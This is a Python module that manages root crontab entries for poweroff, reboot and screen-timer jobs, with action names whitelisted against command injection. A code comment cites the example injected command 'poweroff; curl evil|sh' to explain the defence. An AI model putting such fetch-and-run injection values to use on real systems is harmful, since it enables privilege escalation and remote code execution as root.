import os
import re
import sys
from getpass import getuser
from pathlib import Path

from crontab import CronTab

# Named actions, never free-form commands.
#
# These lines land in *root's* crontab and cron hands each one to /bin/sh, so
# anything assembled from what a user typed in the web UI would be a straight
# privilege escalation: a job "command" of `poweroff; curl evil|sh` would run
# as written. The API therefore accepts one of these keys and nothing else, and
# the command itself is looked up here and never comes from the request.
#
# Keys are what travels over the WebSocket API and what the web UI stores; the
# values are absolute paths, because cron's PATH is minimal and not worth
# relying on.
ACTIONS: dict[str, str] = {
    'pwr': '/usr/sbin/poweroff',
    'reb': '/usr/sbin/reboot',
}

# Reverse map, for reading a crontab back. A job whose command is not in here
# was not written by us (or was written by a newer version) and is reported
# as-is and left alone rather than rewritten into something we recognise.
_ACTION_OF_COMMAND: dict[str, str] = {command: name for name, command in ACTIONS.items()}


# Screen actions are not commands of their own: the line is `<python> screenctl.py <uuid>` and what to do is looked up
# by uuid in screen_control.json (see utils.models.screen_control.ScreenTimer).
SCREEN_ACTIONS = ('scr_on', 'scr_off')
_SCREENCTL = Path(__file__).resolve().parents[2] / 'screenctl.py'
_SCREEN_LINE_RE = re.compile(r'^(\S+) (\S+screenctl\.py) ([0-9a-f]{32})$')


def screen_command(uuid: str) -> str:
    return f'{sys.executable} {_SCREENCTL} {uuid}'


class UniCron(CronTab):
    __job_prefix = 'unitotem:-)'
    last_uuid: str = ''

    def new(self, cmd: str = '', m=None, h=None, dom=None, mon=None, dow=None, **_):
        uuid = os.urandom(16).hex()
        self.last_uuid = uuid
        if cmd in SCREEN_ACTIONS:
            command = screen_command(uuid)
        else:
            command = ACTIONS.get(cmd)
        if command is None:
            return False
        if None in [m, h, dom, mon, dow]:
            # a job with no schedule would silently be '* * * * *', i.e. run every minute
            return False
        item = super().new(
            command,                                    # command
            self.__job_prefix + uuid                    # comment
        )
        item.setall(m, h, dom, mon, dow)  # time
        return True

    def read(self, filename=None) -> 'UniCron':
        super().read(filename)
        return self

    def __enter__(self) -> 'UniCron':
        return self.read()

    def findById(self, uuid: str = None):
        for job in list(self.crons):
            if job.comment.startswith(self.__job_prefix) and (uuid is None or job.comment[11:] == uuid):
                yield job

    def removeById(self, uuid: str = None):
        for job in self.findById(uuid):
            # noinspection PyUnresolvedReferences
            self._remove(job)

    def serialize(self):
        # Every field is the raw cron slice, as a string.
        #
        # It used to be int(str(job.minute)), which raises ValueError on any
        # slice that is not a plain number - and '*' is the default the web UI
        # offers for every field. A single "every day at 22:00" timer, whose
        # day-of-month, month and day-of-week are all '*', therefore blew up
        # jobs for the *whole* list, so one wildcard made every timer on the
        # node invisible. Ranges and steps ('*/15', '1-5', '0,30') could never
        # be represented either.
        #
        # 'command' is the action key, not the path: the path is an
        # implementation detail of this module, and the web UI has always
        # labelled rows by matching against the key (it just never matched,
        # because a full path was sent).
        from utils.models.screen_control import screen_control
        jobs = []
        for job in self.findById():
            uuid = job.comment.removeprefix(self.__job_prefix)
            timer = screen_control.timers.get(uuid) if _SCREEN_LINE_RE.match(job.command) else None
            jobs.append({
                'uuid': uuid,
            'command': f'scr_{timer.state}' if timer else _ACTION_OF_COMMAND.get(job.command, job.command),
            'output': timer.output if timer else None,
            'mechanism': timer.mechanism if timer else None,
            # True when we recognise the command, i.e. when it is safe to offer
            # editing it. A job we did not write keeps its schedule editable but
            # must not have its command rewritten.
            'known': job.command in _ACTION_OF_COMMAND or timer is not None,
            'minute': str(job.minute),
            'hour': str(job.hour),
            'day_of_month': str(job.dom),
            'month': str(job.month),
            'day_of_week': str(job.dow),
            'enabled': job.enabled,
            })
        return jobs


CRONTAB = UniCron(user=getuser())
